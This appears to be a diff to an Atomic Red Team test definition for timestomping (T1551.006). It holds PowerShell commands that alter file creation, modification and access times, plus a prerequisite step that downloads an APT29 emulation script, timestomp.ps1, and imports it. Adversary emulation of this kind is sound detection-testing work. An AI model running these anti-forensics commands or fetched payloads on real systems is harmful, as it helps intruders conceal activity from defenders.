@@ -26,6 +26,7 @@ atomic_tests:
     cleanup_command: |
       rm -f #{target_filename}
     name: sh
+
 - name: Set a file's modification timestamp
   auto_generated_guid: 20ef1523-8758-4898-b5a2-d026cc3d2c52
   description: |
@@ -129,13 +130,13 @@ atomic_tests:
   - description: |
       A file must exist at the path (#{file_path}) to change the creation time on
     prereq_command: |
-      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path} -Force | Out-Null
-      Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
+      New-Item -Path "#{file_path}" -Force | Out-Null
+      Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null
   executor:
     command: |
-      Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}" }
+      Get-ChildItem "#{file_path}" | % { $_.CreationTime = "#{target_date_time}" }
     name: powershell
 - name: Windows - Modify file last modified timestamp with PowerShell
   auto_generated_guid: f8f6634d-93e1-4238-8510-f8a90a20dcf2
@@ -158,13 +159,13 @@ atomic_tests:
   - description: |
       A file must exist at the path (#{file_path}) to change the modified time on
     prereq_command: |
-      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path} -Force | Out-Null
-      Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
+      New-Item -Path "#{file_path}" -Force | Out-Null
+      Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null
   executor:
     command: |
-      Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}" }
+      Get-ChildItem "#{file_path}" | % { $_.LastWriteTime = "#{target_date_time}" }
     name: powershell
 - name: Windows - Modify file last access timestamp with PowerShell
   auto_generated_guid: da627f63-b9bd-4431-b6f8-c5b44d061a62
@@ -185,15 +186,15 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      A file must exist at the path (#{file_path}) to change the last access time on
+      A file must exist at the path ("#{file_path}") to change the last access time on
     prereq_command: |
-      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path} -Force | Out-Null
-      Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
+      New-Item -Path "#{file_path}" -Force | Out-Null
+      Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null
   executor:
     command: |
-      Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}" }
+      Get-ChildItem "#{file_path}" | % { $_.LastAccessTime = "#{target_date_time}" }
     name: powershell
 - name: Windows - Timestomp a File
   auto_generated_guid: d7512c33-3a75-4806-9893-69abc3ccdd43
@@ -209,13 +210,13 @@ atomic_tests:
     file_path:
       description: File path for timestomp payload
       type: string
-      default: $env:appdata\Microsoft
+      default: PathToAtomicsFolder\..\ExternalPayloads
   dependency_executor_name: powershell
   dependencies:
   - description: |
       timestomp.ps1 must be present in #{file_path}.
     prereq_command: |
-      if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}\timestomp.ps1") {exit 0} else {exit 1}
     get_prereq_command: |
       Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
   - description: |
@@ -223,12 +224,9 @@ atomic_tests:
     prereq_command: |
       if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path}\kxwn.lock -ItemType File
+      New-Item -Path "#{file_path}\kxwn.lock" -ItemType File
   executor:
     command: |
-      import-module #{file_path}\timestomp.ps1
+      import-module "#{file_path}\timestomp.ps1"
       timestomp -dest "#{file_path}\kxwn.lock"
-    cleanup_command: |-
-      Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
-      Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore
     name: powershell
